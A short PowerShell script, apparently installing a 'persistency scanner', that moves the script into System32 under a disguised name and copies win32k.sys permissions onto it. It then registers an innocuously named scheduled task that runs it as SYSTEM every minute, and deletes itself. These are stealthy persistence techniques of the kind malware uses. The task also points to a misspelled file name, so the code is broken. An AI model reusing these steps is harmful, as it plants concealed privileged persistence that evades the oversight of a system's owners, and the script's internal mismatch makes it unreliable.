Move-Item -Path windows_persistency_scanner.ps1 -Destination C:\Windows\System32\lpctr.ps1
Get-Acl -Path "C:\Windows\System32\win32k.sys" | Set-Acl -Path "C:\Windows\System32\lpctr.ps1"

$actions=(New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "C:\Windows\System32\lcptr.ps1")

$trigger = New-ScheduledTaskTrigger `
    -Once `
	-RandomDelay "00:01"  `
    -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 1)
	
$task = New-ScheduledTask -Action $actions -Trigger $trigger

Register-ScheduledTask -TaskName 'Task List Scheduler' -InputObject $task -User "System"
Remove-Item $PSCommandPath -Force